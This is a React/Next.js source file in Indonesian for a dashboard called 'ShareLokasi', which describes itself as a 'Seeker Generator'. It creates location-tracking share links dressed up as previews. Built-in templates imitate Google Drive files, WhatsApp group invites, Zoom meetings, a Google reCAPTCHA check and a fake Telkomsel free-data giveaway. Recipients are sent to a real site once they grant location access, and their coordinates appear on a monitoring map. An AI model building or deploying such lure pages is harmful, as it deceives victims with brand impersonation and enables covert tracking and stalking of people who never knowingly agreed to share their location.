'use client';

import { useState, useEffect, useCallback } from 'react';
import Link from 'next/link';
import QRCode from 'qrcode';
import {
  ShieldCheck,
  Copy,
  Check,
  QrCode,
  Clock,
  PlusCircle,
  ArrowRight,
  ExternalLink,
  RefreshCw,
  Globe,
  FileText,
  MessageSquare,
  Video,
  CheckSquare,
  History,
  Trash2,
  Search,
  MapPin,
  Users,
  Compass,
  Layers
} from 'lucide-react';
import { formatTimeRemaining } from '@/lib/utils';
import { LocationSession, TemplateType } from '@/types';

interface SessionHistoryItem extends LocationSession {
  visitorCount?: number;
  locationCount?: number;
}

export default function DashboardHubPage() {
  const [activeTab, setActiveTab] = useState<'create' | 'history'>('history');

  // Form State
  const [templateType, setTemplateType] = useState<TemplateType>('custom');
  const [targetUrl, setTargetUrl] = useState('https://www.telkomsel.com/');
  const [siteName, setSiteName] = useState('Telkomsel.COM');
  const [title, setTitle] = useState('Telkomsel bagi bagi hadiah');
  const [imageUrl, setImageUrl] = useState('https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=600&auto=format&fit=crop&q=60');
  const [description, setDescription] = useState('Telkomsel bagi bagi hadiah kuota internet gratis');
  const [expirationMinutes, setExpirationMinutes] = useState(60);
  const [customMinutes, setCustomMinutes] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Created Result State
  const [createdSession, setCreatedSession] = useState<{
    session: LocationSession;
    shareUrl: string;
    dashboardUrl: string;
  } | null>(null);
  const [qrCodeDataUrl, setQrCodeDataUrl] = useState<string>('');
  const [copied, setCopied] = useState(false);

  // History State
  const [historySessions, setHistorySessions] = useState<SessionHistoryItem[]>([]);
  const [loadingHistory, setLoadingHistory] = useState(false);
  const [historySearch, setHistorySearch] = useState('');
  const [copiedHistoryId, setCopiedHistoryId] = useState<string | null>(null);
  const [deletingId, setDeletingId] = useState<string | null>(null);

  const fetchHistory = useCallback(async () => {
    setLoadingHistory(true);
    try {
      const res = await fetch('/api/sessions');
      if (res.ok) {
        const data = await res.json();
        setHistorySessions(data.sessions || []);
      }
    } catch (err) {
      console.error('Gagal mengambil riwayat sesi:', err);
    } finally {
      setLoadingHistory(false);
    }
  }, []);

  useEffect(() => {
    fetchHistory();
  }, [fetchHistory]);

  const handleTemplateSelect = (type: TemplateType) => {
    setTemplateType(type);
    if (type === 'gdrive') {
      setTitle('Dokumen_Laporan_Keuangan_2026.pdf');
      setSiteName('Google Drive');
      setDescription('1 file dibagikan dengan Anda - Google Drive Storage');
      setTargetUrl('https://drive.google.com');
      setImageUrl('https://images.unsplash.com/photo-1568667256549-094345857637?w=600&auto=format&fit=crop&q=60');
    } else if (type === 'whatsapp') {
      setTitle('Undangan Grup WhatsApp Alumni');
      setSiteName('WhatsApp Group Invite');
      setDescription('Klik untuk bergabung ke grup perbincangan WhatsApp');
      setTargetUrl('https://whatsapp.com');
      setImageUrl('https://images.unsplash.com/photo-1614680376593-902f749f7cfc?w=600&auto=format&fit=crop&q=60');
    } else if (type === 'zoom') {
      setTitle('Undangan Rapat Online Zoom Meeting');
      setSiteName('Zoom Video Communications');
      setDescription('Klik untuk masuk ke dalam ruang rapat Zoom');
      setTargetUrl('https://zoom.us');
      setImageUrl('https://images.unsplash.com/photo-1588196749597-9ff075ee6b5b?w=600&auto=format&fit=crop&q=60');
    } else if (type === 'recaptcha') {
      setTitle('Verifikasi Keamanan Google ReCAPTCHA');
      setSiteName('Google Security Check');
      setDescription('Selesaikan verifikasi untuk melanjutkan akses situs');
      setTargetUrl('https://google.com');
      setImageUrl('');
    }
  };

  const handleCreateSession = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    const minutes = expirationMinutes === 0 ? parseInt(customMinutes, 10) : expirationMinutes;

    if (!minutes || isNaN(minutes) || minutes < 1) {
      setError('Harap masukkan durasi waktu kedaluwarsa yang valid.');
      setLoading(false);
      return;
    }

    try {
      const res = await fetch('/api/sessions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          title: title.trim() || 'Link Preview Sharing',
          templateType,
          targetUrl: targetUrl.trim(),
          siteName: siteName.trim(),
          imageUrl: imageUrl.trim(),
          description: description.trim(),
          expirationMinutes: minutes
        })
      });

      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.error || 'Gagal membuat sesi.');
      }

      setCreatedSession(data);
      fetchHistory(); // refresh history list

      const qr = await QRCode.toDataURL(data.shareUrl, {
        margin: 2,
        width: 250,
        color: {
          dark: '#0f172a',
          light: '#ffffff'
        }
      });
      setQrCodeDataUrl(qr);
    } catch (err: any) {
      setError(err.message || 'Terjadi kesalahan');
    } finally {
      setLoading(false);
    }
  };

  const handleCopyLink = () => {
    if (!createdSession) return;
    navigator.clipboard.writeText(createdSession.shareUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const handleCopyHistoryLink = (sessionCode: string, id: string) => {
    const origin = typeof window !== 'undefined' ? window.location.origin : '';
    const url = `${origin}/share/${sessionCode}`;
    navigator.clipboard.writeText(url);
    setCopiedHistoryId(id);
    setTimeout(() => setCopiedHistoryId(null), 2000);
  };

  const handleDeleteSession = async (id: string) => {
    if (!confirm('Apakah Anda yakin ingin menghapus sesi ini beserta data koordinatnya?')) return;
    setDeletingId(id);
    try {
      const res = await fetch(`/api/sessions?id=${id}`, { method: 'DELETE' });
      if (res.ok) {
        setHistorySessions((prev) => prev.filter((s) => s.id !== id));
      }
    } catch (err) {
      console.error('Gagal menghapus sesi:', err);
    } finally {
      setDeletingId(null);
    }
  };

  const filteredHistory = historySessions.filter((s) => {
    const q = historySearch.toLowerCase();
    return (
      s.title?.toLowerCase().includes(q) ||
      s.session_code?.toLowerCase().includes(q) ||
      s.target_url?.toLowerCase().includes(q)
    );
  });

  const activeCount = historySessions.filter((s) => s.status === 'active').length;
  const expiredCount = historySessions.filter((s) => s.status !== 'active').length;

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 flex flex-col font-sans">
      {/* Header */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
          <Link href="/" className="flex items-center space-x-3">
            <div className="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center text-white font-bold text-sm">
              <ShieldCheck className="w-5 h-5" />
            </div>
            <span className="font-bold text-base text-slate-900 tracking-tight">
              ShareLokasi
            </span>
          </Link>

          {/* Navigation Tabs */}
          <div className="flex items-center bg-slate-100 p-1 rounded-lg border border-slate-200 text-xs font-semibold">
            <button
              onClick={() => setActiveTab('history')}
              className={`px-3 py-1.5 rounded-md flex items-center space-x-1.5 transition-all ${
                activeTab === 'history'
                  ? 'bg-white text-blue-600 shadow-sm'
                  : 'text-slate-600 hover:text-slate-900'
              }`}
            >
              <History className="w-3.5 h-3.5" />
              <span>Riwayat Sesi</span>
              <span className="ml-1 px-1.5 py-0.2 rounded-full bg-blue-50 text-blue-700 text-[10px]">
                {historySessions.length}
              </span>
            </button>

            <button
              onClick={() => {
                setActiveTab('create');
                setCreatedSession(null);
              }}
              className={`px-3 py-1.5 rounded-md flex items-center space-x-1.5 transition-all ${
                activeTab === 'create'
                  ? 'bg-white text-blue-600 shadow-sm'
                  : 'text-slate-600 hover:text-slate-900'
              }`}
            >
              <PlusCircle className="w-3.5 h-3.5" />
              <span>Buat Tautan Baru</span>
            </button>
          </div>

          <Link
            href="/"
            className="text-xs font-medium text-slate-600 hover:text-slate-900 transition-colors hidden sm:block"
          >
            ← Beranda
          </Link>
        </div>
      </header>

      {/* Main Container */}
      <main className="max-w-6xl mx-auto w-full px-4 sm:px-6 py-8 flex-1">
        {activeTab === 'history' ? (
          /* TAB RIWAYAT SESI */
          <div className="space-y-6">
            {/* Top Bar with Title and Actions */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div>
                <h1 className="text-2xl font-bold text-slate-900 tracking-tight">
                  Riwayat Sesi Lokasi
                </h1>
                <p className="text-xs text-slate-500 mt-1">
                  Kelola dan pantau semua link pelacak lokasi yang pernah Anda buat.
                </p>
              </div>

              <div className="flex items-center space-x-2.5">
                <button
                  onClick={fetchHistory}
                  disabled={loadingHistory}
                  className="px-3 py-2 rounded-lg bg-white border border-slate-200 text-slate-700 hover:bg-slate-50 text-xs font-medium flex items-center space-x-1.5 shadow-sm transition-colors"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${loadingHistory ? 'animate-spin text-blue-600' : ''}`} />
                  <span>Segarkan</span>
                </button>

                <button
                  onClick={() => {
                    setActiveTab('create');
                    setCreatedSession(null);
                  }}
                  className="px-3.5 py-2 rounded-lg bg-blue-600 hover:bg-blue-700 text-white text-xs font-medium flex items-center space-x-1.5 shadow-sm transition-colors"
                >
                  <PlusCircle className="w-3.5 h-3.5" />
                  <span>Buat Sesi Baru</span>
                </button>
              </div>
            </div>

            {/* Stat Cards */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
              <div className="p-4 rounded-xl bg-white border border-slate-200 shadow-sm flex items-center justify-between">
                <div>
                  <span className="text-[11px] font-semibold text-slate-500 uppercase tracking-wider">
                    Total Sesi Dibuat
                  </span>
                  <h3 className="text-2xl font-bold text-slate-900 mt-0.5">{historySessions.length}</h3>
                </div>
                <div className="w-10 h-10 rounded-lg bg-blue-50 border border-blue-100 text-blue-600 flex items-center justify-center">
                  <Layers className="w-5 h-5" />
                </div>
              </div>

              <div className="p-4 rounded-xl bg-white border border-slate-200 shadow-sm flex items-center justify-between">
                <div>
                  <span className="text-[11px] font-semibold text-slate-500 uppercase tracking-wider">
                    Sesi Aktif
                  </span>
                  <h3 className="text-2xl font-bold text-emerald-600 mt-0.5">{activeCount}</h3>
                </div>
                <div className="w-10 h-10 rounded-lg bg-emerald-50 border border-emerald-100 text-emerald-600 flex items-center justify-center">
                  <Compass className="w-5 h-5" />
                </div>
              </div>

              <div className="p-4 rounded-xl bg-white border border-slate-200 shadow-sm flex items-center justify-between">
                <div>
                  <span className="text-[11px] font-semibold text-slate-500 uppercase tracking-wider">
                    Kedaluwarsa / Selesai
                  </span>
                  <h3 className="text-2xl font-bold text-slate-600 mt-0.5">{expiredCount}</h3>
                </div>
                <div className="w-10 h-10 rounded-lg bg-slate-100 border border-slate-200 text-slate-600 flex items-center justify-center">
                  <Clock className="w-5 h-5" />
                </div>
              </div>
            </div>

            {/* Search Input */}
            <div className="relative">
              <Search className="w-4 h-4 text-slate-400 absolute left-3.5 top-3" />
              <input
                type="text"
                placeholder="Cari berdasarkan judul, kode sesi, atau tautan target..."
                value={historySearch}
                onChange={(e) => setHistorySearch(e.target.value)}
                className="w-full pl-10 pr-4 py-2.5 rounded-xl bg-white border border-slate-200 text-xs text-slate-900 focus:outline-none focus:border-blue-600 shadow-sm"
              />
            </div>

            {/* Session List */}
            {loadingHistory && historySessions.length === 0 ? (
              <div className="py-16 text-center bg-white rounded-xl border border-slate-200 p-8 shadow-sm">
                <RefreshCw className="w-7 h-7 text-blue-600 animate-spin mx-auto mb-3" />
                <p className="text-xs text-slate-500">Memuat riwayat sesi...</p>
              </div>
            ) : filteredHistory.length === 0 ? (
              <div className="py-16 text-center bg-white rounded-xl border border-slate-200 p-8 shadow-sm space-y-3">
                <div className="w-12 h-12 rounded-full bg-slate-100 text-slate-400 flex items-center justify-center mx-auto">
                  <History className="w-6 h-6" />
                </div>
                <h3 className="text-sm font-bold text-slate-800">
                  {historySearch ? 'Tidak ada sesi yang cocok' : 'Belum Ada Riwayat Sesi'}
                </h3>
                <p className="text-xs text-slate-500 max-w-sm mx-auto">
                  {historySearch
                    ? 'Coba gunakan kata kunci pencarian yang lain.'
                    : 'Anda belum memiliki sesi aktif atau yang pernah dibuat. Mulai buat link preview pertama Anda!'}
                </p>
                {!historySearch && (
                  <button
                    onClick={() => {
                      setActiveTab('create');
                      setCreatedSession(null);
                    }}
                    className="mt-2 px-4 py-2 rounded-lg bg-blue-600 text-white text-xs font-semibold shadow-sm hover:bg-blue-700 transition-colors inline-flex items-center space-x-1.5"
                  >
                    <PlusCircle className="w-3.5 h-3.5" />
                    <span>Buat Tautan Sekarang</span>
                  </button>
                )}
              </div>
            ) : (
              <div className="grid grid-cols-1 gap-3.5">
                {filteredHistory.map((s) => {
                  const isActive = s.status === 'active';
                  return (
                    <div
                      key={s.id}
                      className="p-5 rounded-xl bg-white border border-slate-200 shadow-sm hover:border-slate-300 transition-all flex flex-col md:flex-row md:items-center justify-between gap-4"
                    >
                      <div className="space-y-1.5 flex-1 min-w-0">
                        <div className="flex items-center space-x-2.5 flex-wrap">
                          <h3 className="text-sm font-bold text-slate-900 truncate">
                            {s.title}
                          </h3>
                          <span
                            className={`px-2 py-0.5 rounded-full text-[11px] font-semibold border flex items-center space-x-1 ${
                              isActive
                                ? 'bg-emerald-50 border-emerald-200 text-emerald-700'
                                : 'bg-slate-100 border-slate-200 text-slate-600'
                            }`}
                          >
                            <span
                              className={`w-1.5 h-1.5 rounded-full ${
                                isActive ? 'bg-emerald-500 animate-pulse' : 'bg-slate-400'
                              }`}
                            />
                            <span className="capitalize">{s.status}</span>
                          </span>
                          <span className="text-[11px] font-mono text-slate-500 bg-slate-100 px-2 py-0.5 rounded">
                            Kode: {s.session_code}
                          </span>
                        </div>

                        {s.target_url && (
                          <p className="text-xs text-slate-500 truncate flex items-center space-x-1.5">
                            <span className="font-semibold text-slate-600">Target:</span>
                            <span className="font-mono text-blue-600">{s.target_url}</span>
                          </p>
                        )}

                        <div className="flex items-center space-x-4 text-[11px] text-slate-400 pt-0.5">
                          <span>Dibuat: {new Date(s.created_at).toLocaleDateString()} {new Date(s.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>
                          <span>•</span>
                          <span>
                            {isActive ? `Sisa: ${formatTimeRemaining(s.expires_at)}` : 'Selesai'}
                          </span>
                        </div>
                      </div>

                      {/* Action Buttons */}
                      <div className="flex items-center space-x-2 shrink-0 pt-2 md:pt-0 border-t md:border-t-0 border-slate-100">
                        <Link
                          href={`/dashboard/${s.id}`}
                          className="px-3 py-2 rounded-lg bg-blue-600 hover:bg-blue-700 text-white text-xs font-semibold flex items-center space-x-1.5 shadow-sm transition-colors"
                          title="Buka Peta Pemantauan"
                        >
                          <MapPin className="w-3.5 h-3.5" />
                          <span>Pantau Peta</span>
                        </Link>

                        <button
                          onClick={() => handleCopyHistoryLink(s.session_code, s.id)}
                          className="px-3 py-2 rounded-lg bg-white border border-slate-200 text-slate-700 hover:bg-slate-50 text-xs font-medium flex items-center space-x-1.5 shadow-sm transition-colors"
                          title="Salin Tautan Share"
                        >
                          {copiedHistoryId === s.id ? (
                            <>
                              <Check className="w-3.5 h-3.5 text-emerald-600" />
                              <span className="text-emerald-600 font-semibold">Tersalin!</span>
                            </>
                          ) : (
                            <>
                              <Copy className="w-3.5 h-3.5" />
                              <span>Salin</span>
                            </>
                          )}
                        </button>

                        <button
                          onClick={() => handleDeleteSession(s.id)}
                          disabled={deletingId === s.id}
                          className="p-2 rounded-lg bg-white border border-red-200 text-red-600 hover:bg-red-50 text-xs transition-colors shadow-sm"
                          title="Hapus Sesi"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        ) : (
          /* TAB BUAT TAUTAN BARU */
          <div className="max-w-3xl mx-auto space-y-6">
            <div>
              <h1 className="text-2xl font-bold text-slate-900">Buat Tautan Custom Preview (Seeker Generator)</h1>
              <p className="text-xs text-slate-600 mt-1">
                Pilih template atau masukkan Target Website URL (seperti Telkomsel, Google Drive, WhatsApp) yang akan dibuka penerima setelah izin lokasi disetujui.
              </p>
            </div>

            {!createdSession ? (
              /* Form Card */
              <div className="p-6 sm:p-8 rounded-xl bg-white border border-slate-200 shadow-sm space-y-6">
                <form onSubmit={handleCreateSession} className="space-y-6">
                  {error && (
                    <div className="p-3.5 rounded-lg bg-red-50 border border-red-200 text-red-700 text-xs font-medium">
                      {error}
                    </div>
                  )}

                  {/* Template Selection Grid */}
                  <div>
                    <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-2">
                      Pilih Template Tautan Preview
                    </label>
                    <div className="grid grid-cols-2 sm:grid-cols-5 gap-2.5">
                      {[
                        { id: 'custom', label: 'Custom Link', icon: <Globe className="w-4 h-4 text-blue-600" /> },
                        { id: 'gdrive', label: 'Google Drive', icon: <FileText className="w-4 h-4 text-emerald-600" /> },
                        { id: 'whatsapp', label: 'WhatsApp', icon: <MessageSquare className="w-4 h-4 text-green-600" /> },
                        { id: 'zoom', label: 'Zoom Meeting', icon: <Video className="w-4 h-4 text-indigo-600" /> },
                        { id: 'recaptcha', label: 'ReCaptcha', icon: <CheckSquare className="w-4 h-4 text-amber-600" /> },
                      ].map((t) => (
                        <button
                          key={t.id}
                          type="button"
                          onClick={() => handleTemplateSelect(t.id as TemplateType)}
                          className={`p-3 rounded-lg border text-xs font-medium flex flex-col items-center justify-center space-y-1.5 transition-all ${
                            templateType === t.id
                              ? 'bg-blue-50 border-blue-600 text-blue-700 font-semibold shadow-sm'
                              : 'bg-white border-slate-200 text-slate-700 hover:bg-slate-50'
                          }`}
                        >
                          {t.icon}
                          <span>{t.label}</span>
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Dynamic Form Inputs */}
                  <div className="p-5 rounded-lg bg-slate-50 border border-slate-200 space-y-4">
                    <h3 className="text-xs font-bold uppercase text-slate-700 tracking-wider">
                      Konfigurasi Preview Website Tujuan (Target URL)
                    </h3>

                    {/* Target URL */}
                    <div>
                      <label className="block text-xs font-semibold text-slate-700 mb-1">
                        Enter Target URL (Website yang dibuka setelah disetujui)
                      </label>
                      <input
                        type="url"
                        placeholder="https://www.telkomsel.com/"
                        value={targetUrl}
                        onChange={(e) => setTargetUrl(e.target.value)}
                        required
                        className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs font-mono focus:outline-none focus:border-blue-600"
                      />
                    </div>

                    {/* Site Name & Title */}
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <div>
                        <label className="block text-xs font-semibold text-slate-700 mb-1">
                          Site Name (Nama Situs)
                        </label>
                        <input
                          type="text"
                          placeholder="Telkomsel.COM"
                          value={siteName}
                          onChange={(e) => setSiteName(e.target.value)}
                          className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs focus:outline-none focus:border-blue-600"
                        />
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-slate-700 mb-1">
                          Title (Judul Tautan / Banner)
                        </label>
                        <input
                          type="text"
                          placeholder="Telkomsel bagi bagi hadiah"
                          value={title}
                          onChange={(e) => setTitle(e.target.value)}
                          required
                          className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs focus:outline-none focus:border-blue-600"
                        />
                      </div>
                    </div>

                    {/* Image URL & Description */}
                    <div>
                      <label className="block text-xs font-semibold text-slate-700 mb-1">
                        Image URL (URL Gambar Banner Preview)
                      </label>
                      <input
                        type="text"
                        placeholder="https://gagatekno.id/wp-content/uploads/.../banner.jpg"
                        value={imageUrl}
                        onChange={(e) => setImageUrl(e.target.value)}
                        className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs font-mono focus:outline-none focus:border-blue-600"
                      />
                    </div>

                    <div>
                      <label className="block text-xs font-semibold text-slate-700 mb-1">
                        Description (Deskripsi Singkat)
                      </label>
                      <textarea
                        rows={2}
                        placeholder="Telkomsel bagi bagi hadiah promo kuota internet"
                        value={description}
                        onChange={(e) => setDescription(e.target.value)}
                        className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs focus:outline-none focus:border-blue-600"
                      />
                    </div>
                  </div>

                  {/* Expiration Options */}
                  <div>
                    <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-2">
                      Batas Waktu Berlaku Tautan
                    </label>
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                      {[
                        { label: '15 Menit', mins: 15 },
                        { label: '1 Jam', mins: 60 },
                        { label: '24 Jam', mins: 1440 },
                        { label: 'Kustom', mins: 0 }
                      ].map((item) => (
                        <button
                          key={item.label}
                          type="button"
                          onClick={() => setExpirationMinutes(item.mins)}
                          className={`px-3.5 py-2 rounded-lg border text-xs font-medium transition-all ${
                            expirationMinutes === item.mins
                              ? 'bg-blue-50 border-blue-600 text-blue-700 font-semibold shadow-sm'
                              : 'bg-white border-slate-200 text-slate-700 hover:bg-slate-50'
                          }`}
                        >
                          {item.label}
                        </button>
                      ))}
                    </div>

                    {expirationMinutes === 0 && (
                      <div className="mt-3">
                        <input
                          type="number"
                          placeholder="Masukkan durasi dalam menit (contoh: 45)"
                          value={customMinutes}
                          onChange={(e) => setCustomMinutes(e.target.value)}
                          min={1}
                          max={10080}
                          className="w-full px-3 py-2 rounded-lg bg-white border border-slate-300 text-slate-900 text-xs focus:outline-none focus:border-blue-600"
                        />
                      </div>
                    )}
                  </div>

                  {/* Submit Button */}
                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3.5 rounded-lg bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-semibold text-sm shadow-sm transition-colors flex items-center justify-center space-x-2"
                  >
                    {loading ? (
                      <>
                        <RefreshCw className="w-4 h-4 animate-spin" />
                        <span>Membuat Tautan Preview...</span>
                      </>
                    ) : (
                      <>
                        <PlusCircle className="w-4 h-4" />
                        <span>Buat Tautan Custom Link</span>
                      </>
                    )}
                  </button>
                </form>
              </div>
            ) : (
              /* Result Card */
              <div className="space-y-6">
                <div className="p-6 sm:p-8 rounded-xl bg-white border border-slate-200 shadow-sm space-y-6">
                  <div className="flex items-center justify-between pb-4 border-b border-slate-200">
                    <div>
                      <span className="text-xs text-blue-600 font-semibold uppercase tracking-wider">
                        Tautan Preview Berhasil Dibuat
                      </span>
                      <h2 className="text-xl font-bold text-slate-900 mt-0.5">
                        {createdSession.session.title}
                      </h2>
                      <p className="text-xs text-slate-500 font-mono mt-0.5">
                        Target Redirect: {createdSession.session.target_url || 'N/A'}
                      </p>
                    </div>
                    <span className="px-3 py-1 rounded-full bg-emerald-50 border border-emerald-200 text-emerald-700 text-xs font-semibold">
                      Aktif
                    </span>
                  </div>

                  {/* Share URL Box */}
                  <div>
                    <label className="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-2">
                      Tautan Bagikan (Share Link ke Target)
                    </label>
                    <div className="flex items-center space-x-2 bg-slate-50 p-2 rounded-lg border border-slate-200">
                      <input
                        type="text"
                        readOnly
                        value={createdSession.shareUrl}
                        className="bg-transparent text-xs text-slate-800 px-2 py-1.5 flex-1 focus:outline-none font-mono"
                      />
                      <button
                        onClick={handleCopyLink}
                        className="px-4 py-2 rounded-md bg-blue-600 hover:bg-blue-700 text-white text-xs font-medium flex items-center space-x-1.5 transition-colors shadow-sm"
                      >
                        {copied ? (
                          <>
                            <Check className="w-3.5 h-3.5" />
                            <span>Tersalin!</span>
                          </>
                        ) : (
                          <>
                            <Copy className="w-3.5 h-3.5" />
                            <span>Salin Link</span>
                          </>
                        )}
                      </button>
                    </div>
                  </div>

                  {/* QR Code & Expiration */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-2">
                    <div className="p-4 rounded-lg bg-slate-50 border border-slate-200 flex flex-col items-center justify-center text-center">
                      <div className="w-8 h-8 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center mb-2">
                        <QrCode className="w-4 h-4" />
                      </div>
                      <span className="text-xs font-medium text-slate-700 mb-2">Pindai QR Kode Tautan</span>
                      {qrCodeDataUrl && (
                        <img
                          src={qrCodeDataUrl}
                          alt="QR Code Sesi"
                          className="w-40 h-40 rounded-lg border border-slate-200 bg-white p-2 shadow-sm"
                        />
                      )}
                    </div>

                    <div className="p-5 rounded-lg bg-slate-50 border border-slate-200 flex flex-col justify-between space-y-4">
                      <div>
                        <div className="flex items-center space-x-2 text-slate-700 text-xs font-semibold mb-1">
                          <Clock className="w-4 h-4 text-blue-600" />
                          <span>Sisa Waktu Berlaku</span>
                        </div>
                        <p className="text-xl font-bold text-slate-900">
                          {formatTimeRemaining(createdSession.session.expires_at)}
                        </p>
                        <p className="text-xs text-slate-500 mt-1">
                          Kedaluwarsa pada: {new Date(createdSession.session.expires_at).toLocaleString()}
                        </p>
                      </div>

                      <div className="pt-4 border-t border-slate-200 space-y-2">
                        <Link
                          href={`/dashboard/${createdSession.session.id}`}
                          className="w-full py-2.5 rounded-lg bg-blue-600 hover:bg-blue-700 text-white font-medium text-xs flex items-center justify-center space-x-2 transition-colors shadow-sm"
                        >
                          <span>Buka Dashboard Pemantau Peta</span>
                          <ArrowRight className="w-3.5 h-3.5" />
                        </Link>
                        <button
                          onClick={() => setActiveTab('history')}
                          className="w-full py-2 rounded-lg bg-white border border-slate-300 hover:bg-slate-100 text-slate-700 font-medium text-xs flex items-center justify-center space-x-2 transition-colors"
                        >
                          <History className="w-3.5 h-3.5 text-blue-600" />
                          <span>Lihat di Daftar Riwayat Sesi</span>
                        </button>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="flex justify-center">
                  <button
                    onClick={() => setCreatedSession(null)}
                    className="text-xs font-medium text-slate-600 hover:text-slate-900 transition-colors"
                  >
                    + Buat Tautan Custom Link Lainnya
                  </button>
                </div>
              </div>
            )}
          </div>
        )}
      </main>
    </div>
  );
}
